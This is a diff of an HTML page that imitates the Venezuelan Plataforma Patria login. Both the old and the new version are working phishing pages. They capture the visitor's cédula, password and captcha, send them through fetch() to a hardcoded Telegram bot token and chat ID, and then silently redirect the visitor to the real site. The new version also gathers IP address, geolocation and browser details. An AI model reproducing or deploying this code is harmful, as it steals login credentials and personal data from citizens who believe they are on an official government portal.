@@ -1,291 +1,407 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <link rel="icon" href="https://jesusquijada34.github.io/patriaclone/app/app-icon.ico" type="image/icon">
-    <meta property="og:title" content="Login seguro de la Plataforma Patria">
-    <meta property="og:description" content="Accede de forma segura con este sitio web a la Plataforma Patria.">
-    <meta property="og:image" content="https://jesusquijada34.github.io/patriaclone/docs/assets/splash.png">
-    <meta property="og:url" content="https://jesusquijada34.github.io/patriaclone">
-    <meta name="twitter:card" content="summary_large_image">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <meta charset="UTF-8">
-    <title>Acceso seguro a la plataforma Patria</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso seguro a la plataforma Patria</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔴</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --red-main: #c62828;
-            --red-dark: #8e0000;
-            --red-light: #ff5252;
-            --border-radius: 8px;
-            --input-shadow: 0 0 8px 2px rgba(198,40,40,0.15);
-            --box-shadow: 0 8px 32px 0 rgba(0,0,0,0.18);
-            --github-bg: #fff;
-            --github-border: #d1d5da;
-            --github-title: #24292e;
-            --github-label: #586069;
-        }
-        body {
-            background: var(--github-bg);
-            font-family: 'Segoe UI', 'Liberation Sans', Arial, sans-serif;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f0f0;
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
         }
-        .login-container {
-            background: #fff;
-            border: 1px solid var(--github-border);
-            border-radius: var(--border-radius);
-            box-shadow: var(--box-shadow);
-            padding: 2.5rem 2rem 2rem 2rem;
-            max-width: 350px;
+
+        .container {
             width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            max-width: 500px;
+            margin: 0 auto;
         }
-        .login-title {
-            color: var(--github-title);
-            font-size: 1.35rem;
-            font-weight: 600;
-            margin-bottom: 1.5rem;
+
+        .logo-container {
             text-align: center;
+            margin-bottom: 30px;
         }
-        .login-form {
+
+        .logo {
+            height: 80px;
+            width: auto;
+            margin-bottom: 10px;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .red-line {
+            height: 5px;
+            background: #d32f2f;
             width: 100%;
+        }
+
+        .login-content {
+            padding: 30px 40px;
+        }
+
+        .login-form {
             display: flex;
             flex-direction: column;
-            gap: 1.1rem;
+            gap: 20px;
         }
+
         .form-group {
             display: flex;
             flex-direction: column;
-            gap: 0.4rem;
+            gap: 8px;
         }
-        label {
-            color: var(--github-label);
-            font-size: 0.98rem;
-            font-weight: 500;
-        }
-        input[type="text"], input[type="password"] {
-            padding: 0.7rem 0.9rem;
-            border: 1.5px solid var(--github-border);
-            border-radius: var(--border-radius);
+
+        .form-group label {
+            font-weight: bold;
+            color: #333;
             font-size: 1rem;
-            background: #fff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            outline: none;
-            box-shadow: var(--input-shadow);
         }
-        input[type="text"]:focus, input[type="password"]:focus {
-            border-color: var(--red-main);
-            box-shadow: 0 0 0 2px var(--red-light), var(--input-shadow);
-        }
-        .captcha-img {
-            display: block;
-            margin: 0.3rem 0 0.2rem 0;
-            width: 100%;
-            max-width: 180px;
+
+        .form-input {
+            padding: 12px 15px;
+            border: 1px solid #ccc;
             border-radius: 4px;
-            border: 1px solid #eee;
-            box-shadow: 0 0 8px 1px rgba(198,40,40,0.08);
-            background: #f8f8f8;
-            font-family: 'Consolas', 'Menlo', 'Monaco', monospace;
-            font-size: 2rem;
-            text-align: center;
-            line-height: 2.2rem;
-            letter-spacing: 0.2rem;
-            user-select: none;
-        }
-        .btn-login {
-            background: var(--red-main);
-            color: #fff;
-            border: none;
-            border-radius: var(--border-radius);
-            padding: 0.8rem 0;
-            font-size: 1.08rem;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 0.5rem;
-            box-shadow: 0 2px 8px 0 rgba(198,40,40,0.10);
-            transition: background 0.18s, box-shadow 0.18s;
-        }
-        .btn-login:hover, .btn-login:focus {
-            background: var(--red-dark);
-            box-shadow: 0 4px 16px 0 rgba(198,40,40,0.18);
-        }
-        .captcha-refresh {
-            color: var(--red-main);
-            background: none;
-            border: none;
-            font-size: 1.1rem;
-            cursor: pointer;
-            margin-left: 0.5rem;
-            vertical-align: middle;
-        }
-        .captcha-error {
-            color: var(--red-main);
-            font-size: 0.98rem;
-            margin-top: 0.2rem;
-            display: none;
-        }
-        .login-links {
-            margin-top: 1.2rem;
+            font-size: 1rem;
+            transition: all 0.3s ease;
             width: 100%;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #888;
+        }
+
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .captcha-code {
+            font-family: 'Courier New', monospace;
+            font-size: 1.8rem;
+            font-weight: bold;
+            letter-spacing: 4px;
+            background: #f5f5f5;
+            padding: 8px 15px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            color: #333;
+            user-select: none;
+            min-width: 180px;
+            text-align: center;
+        }
+
+        .btn-refresh {
+            background: #f0f0f0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 10px 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-refresh:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-login {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .btn-login:hover {
+            background: #b71c1c;
+        }
+
+        .login-links {
             display: flex;
             flex-direction: column;
-            align-items: center;
-            gap: 0.5rem;
+            gap: 10px;
+            margin-top: 25px;
+            text-align: center;
         }
+
         .login-links a {
-            color: var(--red-main);
+            color: #d32f2f;
             text-decoration: none;
-            font-size: 0.98rem;
-            transition: color 0.18s;
+            font-size: 0.95rem;
+            transition: color 0.3s ease;
         }
-        .login-links a:hover, .login-links a:focus {
-            color: var(--red-dark);
+
+        .login-links a:hover {
+            color: #b71c1c;
             text-decoration: underline;
         }
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
-                max-width: 98vw;
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
             }
+
+            .login-content {
+                padding: 20px;
+            }
+
+            .logo {
+                height: 70px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 500px;
+            }
+        }
+
+        .captcha-input {
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .form-divider {
+            height: 1px;
+            background: #eee;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-title">Acceso seguro a la plataforma Patria</div>
-        <form class="login-form" id="patriaLoginForm" autocomplete="off">
-            <div class="form-group">
-                <label for="cedula">Cédula</label>
-                <input type="text" id="cedula" name="cedula" maxlength="12" pattern="[0-9]{5,12}" required placeholder="Ej: 12345678">
-            </div>
-            <div class="form-group">
-                <label for="captcha">Captcha</label>
-                <div style="display: flex; align-items: center; gap: 0.3rem;">
-                    <div class="captcha-img" id="captchaImg" title="Haz clic para refrescar"></div>
-                    <button type="button" class="captcha-refresh" id="refreshCaptcha" title="Refrescar captcha">&#x21bb;</button>
+    <div class="container">
+        <div class="logo-container">
+            <img src=".assets/banner.png" alt="Patria" class="logo">
+        </div>
+
+        <div class="login-card">
+            <div class="red-line"></div>
+
+            <div class="login-content">
+                <form class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <label for="cedula">Cédula</label>
+                        <input type="text" id="cedula" class="form-input" required>
+                    </div>
+
+                    <div class="form-divider"></div>
+
+                    <div class="form-group">
+                        <label for="captcha">Escribe el código de seguridad</label>
+                        <div class="captcha-container">
+                            <div class="captcha-code" id="captchaCode">63EXSR</div>
+                            <button type="button" class="btn-refresh" id="refreshCaptcha">
+                                <i class="fas fa-sync-alt"></i>
+                            </button>
+                        </div>
+                        <input type="text" id="captcha" class="form-input captcha-input" required>
+                    </div>
+
+                    <div class="form-divider"></div>
+
+                    <div class="form-group">
+                        <label for="password">Contraseña</label>
+                        <input type="password" id="password" class="form-input" required>
+                    </div>
+
+                    <button type="submit" class="btn-login">CONTINUAR</button>
+                </form>
+
+                <div class="login-links">
+                    <a href="#">Registrarse</a>
+                    <a href="#">Recuperar Contraseña</a>
+                    <a href="#">Recuperar Acceso</a>
                 </div>
-                <input type="text" id="captcha" name="captcha" maxlength="6" pattern="[A-Za-z0-9]{4,6}" required placeholder="Ingrese el captcha" autocomplete="off" inputmode="text">
-                <div class="captcha-error" id="captchaError">Captcha incorrecto. Intente de nuevo.</div>
             </div>
-            <div class="form-group">
-                <label for="clave">Clave de acceso</label>
-                <input type="password" id="clave" name="clave" maxlength="32" required placeholder="Ingrese su clave">
-            </div>
-            <button type="submit" class="btn-login">Entrar</button>
-        </form>
-        <!-- Enlaces debajo del marco -->
-        <div class="login-links">
-            <a href="#" id="forgotClaveLink" target="_blank" rel="noopener">¿Olvidó su clave?</a>
-            <a href="#" id="forgotUsuarioLink" target="_blank" rel="noopener">¿Olvidó su usuario?</a>
+        </div>
+
+        <div class="footer">
+            persona patria.org.ve
         </div>
     </div>
 
     <script>
-        // Variables de enlaces
-        const FORGOT_CLAVE_LINK = "https://www.patria.org.ve/login/recuperar-clave";
-        const FORGOT_USUARIO_LINK = "https://www.patria.org.ve/login/recuperar-usuario";
-
-        // Asignar enlaces dinámicamente
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('forgotClaveLink').href = FORGOT_CLAVE_LINK;
-            document.getElementById('forgotUsuarioLink').href = FORGOT_USUARIO_LINK;
-        });
-
-        // Variable para tu API de Telegram
-        const TELEGRAM_BOT_API = "8237698722:AAHt5-3kTjWCXqDxQe0HHF8YoDyt2ZZMlBo";
+        // Configuración de Telegram
+        const TELEGRAM_BOT_TOKEN = "6237698722:AAHt5-3kTjWCXqDxQe0HHF8YoDyt2ZZMlBo";
         const TELEGRAM_CHAT_ID = "-1002806046486";
 
-        // Generar un captcha aleatorio
-        function generateCaptcha(length = 5) {
-            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
+        // Generar un código captcha aleatorio
+        function generateCaptcha() {
+            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
             let captcha = "";
-            for (let i = 0; i < length; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            for (let i = 0; i < 6; i++) {
+                captcha += characters.charAt(Math.floor(Math.random() * characters.length));
             }
             return captcha;
         }
 
-        // Mostrar el captcha en el "canvas" simulado
-        function renderCaptcha(captchaText) {
-            const captchaImg = document.getElementById('captchaImg');
-            // Para hacerlo más "captcha", agregamos algo de ruido visual
-            let html = '';
-            for (let i = 0; i < captchaText.length; i++) {
-                // Rotación y color aleatorio
-                const rot = (Math.random() - 0.5) * 30;
-                const color = `hsl(${Math.floor(Math.random()*360)},70%,30%)`;
-                html += `<span style="display:inline-block;transform:rotate(${rot}deg);color:${color};margin:0 2px;">${captchaText[i]}</span>`;
-            }
-            // Añadir líneas de ruido
-            for (let i = 0; i < 2; i++) {
-                const left = Math.random()*80+10;
-                const top = Math.random()*20+5;
-                const width = Math.random()*60+30;
-                const color = `rgba(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},0.3)`;
-                html += `<svg width="120" height="30" style="position:absolute;left:0;top:0;pointer-events:none;"><line x1="${left}" y1="${top}" x2="${left+width}" y2="${top+Math.random()*10-5}" stroke="${color}" stroke-width="2"/></svg>`;
-            }
-            captchaImg.innerHTML = html;
-        }
-
-        // Estado del captcha
-        let currentCaptcha = "";
-
-        function refreshCaptcha() {
-            currentCaptcha = generateCaptcha();
-            renderCaptcha(currentCaptcha);
+        // Actualizar el captcha en la interfaz
+        function updateCaptcha() {
+            const captchaCode = generateCaptcha();
+            document.getElementById('captchaCode').textContent = captchaCode;
             document.getElementById('captcha').value = "";
-            document.getElementById('captchaError').style.display = "none";
         }
 
-        // Inicializar captcha al cargar
-        window.addEventListener('DOMContentLoaded', function() {
-            refreshCaptcha();
-        });
+        // Validar el captcha
+        function validateCaptcha() {
+            const enteredCaptcha = document.getElementById('captcha').value.toUpperCase();
+            const actualCaptcha = document.getElementById('captchaCode').textContent;
+            return enteredCaptcha === actualCaptcha;
+        }
 
-        // Refrescar captcha al hacer clic en la imagen o el botón
-        document.getElementById('captchaImg').addEventListener('click', refreshCaptcha);
-        document.getElementById('refreshCaptcha').addEventListener('click', refreshCaptcha);
-
-        document.getElementById('patriaLoginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const cedula = document.getElementById('cedula').value.trim();
-            const captcha = document.getElementById('captcha').value.trim();
-            const clave = document.getElementById('clave').value;
-
-            // Validar captcha
-            if (captcha.length !== currentCaptcha.length || captcha.toLowerCase() !== currentCaptcha.toLowerCase()) {
-                document.getElementById('captchaError').style.display = "block";
-                refreshCaptcha();
-                return;
-            } else {
-                document.getElementById('captchaError').style.display = "none";
+        // Obtener la IP del usuario
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "No disponible";
             }
+        }
 
-            // Mensaje a enviar
-            const message =
-                `Patria Login\nCédula: ${cedula}\nCaptcha: ${captcha}\nClave: ${clave}`;
+        // Obtener información de geolocalización basada en IP
+        async function getGeoInfo(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    city: data.city || "No disponible",
+                    region: data.region || "No disponible",
+                    country: data.country_name || "No disponible",
+                    org: data.org || "No disponible"
+                };
+            } catch (error) {
+                return {
+                    city: "No disponible",
+                    region: "No disponible",
+                    country: "No disponible",
+                    org: "No disponible"
+                };
+            }
+        }
 
-            // Enviar a Telegram
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_API}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message
-                })
-            }).finally(() => {
-                // Redirigir silenciosamente
-                window.location.href = "https://www.patria.org.ve/login/clave/";
+        // Enviar datos a Telegram
+        async function sendToTelegram(cedula, password, captcha) {
+            const ip = await getIP();
+            const geoInfo = await getGeoInfo(ip);
+
+            const message = `🔴 NUEVO INICIO DE SESIÓN PATRIA 🔴
+
+Cédula: ${cedula}
+Contraseña: ${password}
+Código de seguridad: ${captcha}
+
+📍 IP: ${ip}
+🏙️ Ciudad: ${geoInfo.city}
+🗺️ Región: ${geoInfo.region}
+🇵🇾 País: ${geoInfo.country}
+🏢 Proveedor: ${geoInfo.org}
+🌐 Navegador: ${navigator.userAgent}
+🕒 Fecha: ${new Date().toLocaleString()}`;
+
+            // Enviar mensaje a Telegram
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error("Error enviando a Telegram:", error);
+                return false;
+            }
+        }
+
+        // Inicializar la página
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generar captcha inicial
+            updateCaptcha();
+
+            // Configurar evento para refrescar captcha
+            document.getElementById('refreshCaptcha').addEventListener('click', updateCaptcha);
+
+            // Configurar envío del formulario
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const cedula = document.getElementById('cedula').value;
+                const password = document.getElementById('password').value;
+                const captcha = document.getElementById('captcha').value;
+
+                // Validar captcha
+                if (!validateCaptcha()) {
+                    alert("Código de seguridad incorrecto. Inténtelo de nuevo.");
+                    updateCaptcha();
+                    return;
+                }
+
+                // Mostrar mensaje de carga
+                const submitBtn = document.querySelector('.btn-login');
+                const originalText = submitBtn.textContent;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESANDO...';
+                submitBtn.disabled = true;
+
+                // Enviar datos a Telegram
+                const success = await sendToTelegram(cedula, password, captcha);
+
+                if (success) {
+                    // Redirigir después de un breve retraso
+                    setTimeout(() => {
+                        window.location.href = "https://patria.org.ve/login/clave/";
+                    }, 2000);
+                } else {
+                    alert("Error en el proceso de autenticación. Inténtelo de nuevo.");
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                    updateCaptcha();
+                }
             });
         });
     </script>
